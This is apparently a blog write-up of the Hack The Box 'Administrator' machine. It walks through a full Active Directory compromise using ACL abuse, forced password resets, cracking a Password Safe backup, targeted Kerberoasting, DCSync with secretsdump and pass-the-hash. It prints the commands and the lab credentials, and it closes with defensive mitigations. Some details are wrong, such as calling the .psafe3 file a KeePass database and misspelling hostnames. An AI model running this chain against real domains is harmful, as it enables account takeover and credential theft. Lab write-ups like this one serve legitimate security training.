## üèÆ Introduction
Hello I'm Dr4xven and welcome back to the my series of Active Directory Machines Exploitation

Lets get our hhands dirt by compromising this Lab `Administrator`, it is a medium-difficulty Windows machine on Hack The Box that simulates a full Active Directory domain compromise. It challenges the attacker to chain together multiple stages of enumeration, privilege escalation, and credential abuse ‚Äî reflecting real-world attack paths commonly exploited in enterprise environments.

The engagement begins with access to a low-privileged user, and through meticulous analysis of Access Control Lists (`ACLs`), we discover that the user olivia has `GenericAll rights` over the account michael, enabling us to reset his password. Once we gain access as michael, further enumeration reveals his ability to reset the password of benjamin, which leads to access over `FTP`. There, we discover and crack a `backup.psafe3` file, revealing a trove of user credentials.

Credential `spraying` against the domain identifies valid access for the user emily, who holds `GenericWrite` permissions over the user ethan. We leverage this to perform a targeted `Kerberoasting` attack, successfully cracking ethan's credentials. With these, we confirm that ethan possesses `DCSync` privileges ‚Äî ultimately allowing us to extract the Administrator hash and achieve full domain compromise.

This lab is an excellent exercise in understanding privilege escalation paths, abuse of Active Directory misconfigurations, and post-exploitation tactics in domain environments.

## üßê Enumeration
The initial phase of this engagement focuses on identifying accessible services and collecting information about the domain environment to map out possible attack vectors. With credentials for a low-privileged user provided, we begin by performing both network-level and domain-level reconnaissance.

### Credentials

üìÅ SMB Enumeration: From Null Sessions to Credentialed Access

To assess the accessible shares and services, I began with SMB enumeration. Using crackmapexec, I tested both anonymous (null) access and authenticated access with the provided credentials.

```php
crackmapexec smb 10.10.11.130
```
![screenshot](assets/screenshots/Administrator/1.png)
While null sessions were not permitted, credentialed access revealed that the user olivia had login capabilities via WinRM (Windows Remote Management) ‚Äî a key finding that confirmed remote code execution was possible. 

To establish an initial foothold on the target system, I leveraged the `evil-winrm tool`, which enabled secure remote access via the WinRM protocol.
```php
evil-winrm -i administrattor.htb -u 'Olivia' -p 'ichliebedich'
```
![screenshot](assets/screenshots/Administrator/2.png)

After successfully gaining access to the system, I proceeded to enumerate all local user accounts by executing the `net user` command.

![screenshot](assets/screenshots/Administrator/3.png)

With the list of local users obtained, the next step involved identifying remote login-capable accounts. This helps determine which users can authenticate over services such as `WinRM` for potential further access.

![screenshot](assets/screenshots/Administrator/4.png)

After identifying user accounts, I encountered a challenge‚Äînone of the credentials were valid for authentication. To address this, I conducted a registry inspection to uncover any potentially stored credentials. I used the following commands to search for plaintext passwords or saved credentials within the registry:

```php
reg query HKLM\SAM /f password /s
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings /v ProxyUser
```
![screenshot](assets/screenshots/Administrator/5.png)

These commands aimed to locate weakly protected credentials often stored in commonly targeted registry locations.

Unfortunately, the registry search did not reveal any stored passwords. Although this was a potential avenue for credential discovery, it ultimately yielded no usable results. This highlights the importance of exploring multiple enumeration vectors during a domain compromise.

## üîç BloodHound Enumeration via bloodhound-python

To gather detailed information about the Active Directory (AD) environment and identify potential attack paths, I used the bloodhound-python tool. The following command was executed:

```php
bloodhound-python -v -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb --dns-tcp -c All
```

Breakdown of the command:

    -v: Enables verbose output, providing real-time feedback as data is collected.

    -u Olivia: Specifies the username Olivia for authentication.

    -p ichliebedich: Provides the corresponding password for the user.

    -ns 10.10.11.42: Sets the nameserver to the target domain controller's IP address (10.10.11.42).

    -d administrator.htb: Defines the domain to enumerate, in this case, administrator.htb.

    --dns-tcp: Forces DNS queries to use TCP instead of UDP (more reliable for larger queries).

    -c All: Collects all available data types supported by the tool (e.g., sessions, ACLs, group memberships, etc.).

This command allows to gather a full picture of the AD environment, including user permissions, group memberships, session information, and delegation rights. The collected data can later be visualized in the BloodHound GUI to identify privilege escalation paths and misconfigurations.
```php
bloodhound-python -v -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb --dns-tcp -c All
```

### üîé BloodHound Analysis & Ownership Delegation

After successfully collecting the data using bloodhound-python, I uploaded it to the BloodHound-CE interface for analysis. To begin the investigation, I set the Olivia user as the starting point by marking her as the owned principal within BloodHound.

From there, I explored outbound object relationships‚Äîthe users and assets over which Olivia has some level of control or privilege. This helped identify potential lateral movement or privilege escalation paths originating from the Olivia account.

![screenshot](assets/screenshots/Administrator/6.png)

## üõ†Ô∏è Privilege Escalation via GenericAll on Michael

Upon analyzing the outbound object relationships in BloodHound, it was identified that the user Olivia holds GenericAll privileges over the Michael user account. This level of access grants full control, including the ability to reset the target's password.

Leveraging this, I forcefully reset Michael‚Äôs password, effectively gaining unauthorized access to his account‚Äîenabling the next stage of lateral movement within the domain.

```php
net user michael Password123
```
![screenshot](assets/screenshots/Administrator/7.png)

## üß© Privilege Escalation via ForceChangePassword
Based on the BloodHound analysis, it was identified that Michael holds the ForceChangePassword privilege over the user Benjamin. Leveraging this insight, I performed a password reset on Benjamin‚Äôs account without requiring his current credentials ‚Äî an effective technique when such delegated rights are misconfigured in an Active Directory environment.
```php
net rpc password "benjamin" "Batman@123" -U "administrator.htb"/"michael"%"Password123" -S "administrator.htb"
```
### üìÅ Credential Validation and FTP Access

Using the valid credentials:

    administrator.htb\olivia : ichliebedich

    administrator.htb\michael : Password123

    administrator.htb\benjamin : Batman@123

I compiled user and password lists, then systematically tested them across available services. During this enumeration, FTP access was successfully obtained using Benjamin‚Äôs credentials, revealing a potential data exposure vector.

## üßø Accesssing the FTP
```php
ftp administrator.htb
```
![screenshot](assets/screenshots/Administrator/10.png)

While enumerating the accessible FTP service using Benjamin‚Äôs credentials, I discovered a file named `Backup.psafe3`. Recognizing the potential sensitivity of this file, I downloaded it to my local attacking machine for further analysis and potential credential extraction.
![screenshot](assets/screenshots/Administrator/11.png)

### üîê Cracking the Backup.psafe3 File

The Backup.psafe3 file appeared to be a KeePass database. I extracted its hash and performed a password cracking attack using Hashcat, which successfully revealed the master password. This granted access to the stored credentials within the database.
![screenshot](assets/screenshots/Administrator/12.png)

The Password was serverd here
![screenshot](assets/screenshots/Administrator/13.png)

With the cracked master password, I successfully unlocked the Backup.psafe3 file. Inside, I uncovered multiple stored credentials, which expanded my access within the domain and enabled further privilege escalation.
![screenshot](assets/screenshots/Administrator/14.png)

The Credentials
![screenshot](assets/screenshots/Administrator/15.png)

Using the retrieved credentials, I successfully authenticated as the user emily, gaining a new foothold in the environment for further enumeration and privilege escalation.

![screenshot](assets/screenshots/Administrator/16.png)

Upon enumerating the user emily‚Äôs desktop, I successfully located the user flag, marking a significant milestone in the exploitation process.
![screenshot](assets/screenshots/Administrator/17.png)

## üî• Targeted Keberosting
To escalate the attack further, I leveraged the targetedkerberoasting.py script from GitHub, using the credentials of user emily. This allowed me to perform a targeted Kerberoasting attack, aiming to retrieve service account hashes that could potentially lead to higher-privileged accounts.
![screenshot](assets/screenshots/Administrator/19.png)

After retrieving the Kerberos service ticket hash from the targeted Kerberoasting attack, I used John the Ripper to successfully crack it. The cracked credentials granted access to the user ethan, advancing us significantly toward full domain compromise.
```php
john admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![screenshot](assets/screenshots/Administrator/20.png)

## üîë DCSync Attack for Privilege Escalation

With valid credentials for the user ethan, I attempted access via WinRM but was unsuccessful. Based on BloodHound analysis, I confirmed that ethan possessed DCSync privileges. Leveraging this, I executed a DCSync attack to extract secrets from the domain controller, ultimately retrieving the NTLM hash of the Administrator account, leading to full domain compromise.

```php
impacket-secretsdump "administrator.htb/ethan:limpbizkit"@"dc.administrator.htb"
```
![screenshot](assets/screenshots/Administrator/21.png)

## üîê Final Step: Administrator Access via WinRM

After successfully dumping the Administrator NTLM hash through the DCSync attack, I performed a pass-the-hash authentication using evil-winrm, gaining privileged access to the domain as Administrator.
```php
evil-winrm -i administrator.htb -u adminstrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
```
![screenshot](assets/screenshots/Administrator/22.png)

## üéØ Domain Compromise Achieved

With access as Administrator, I navigated to the desktop and retrieved the root flag, marking the successful full compromise of the domain.

## üßæ Conclusion

The Administrator machine showcased a realistic domain escalation scenario where improper permission configurations and weak credential management led to full domain compromise. Starting with a low-privileged user, we exploited misconfigured ACLs to pivot between accounts, eventually gaining access to sensitive files. Through careful enumeration, password cracking, and targeted Kerberoasting, we escalated privileges and obtained DCSync rights, enabling us to retrieve the Administrator hash and fully compromise the domain controller.
## üßØ Mitigation & Defense Strategies

To prevent such attacks in real-world environments, the following measures are recommended:

    Implement the Principle of Least Privilege: Review and restrict unnecessary GenericAll, GenericWrite, and ForceChangePassword permissions in Active Directory.

    Enforce Strong Password Policies: Require complex passwords and regular rotation for all domain users, especially privileged accounts.

    Monitor and Audit AD Changes: Use centralized logging to monitor changes to user permissions and unusual account activities.

    Limit Service Account Privileges: Avoid granting service accounts excessive permissions unless absolutely necessary.

    Secure FTP and Remote Services: Disable unused services like FTP and secure remote access protocols with proper credential management and segmentation.

    Use LAPS: Implement Local Administrator Password Solution (LAPS) to manage local admin credentials securely.

    Detect and Prevent Credential Dumping: Use EDR tools and enable LSASS protection to detect secretsdump-like behavior.
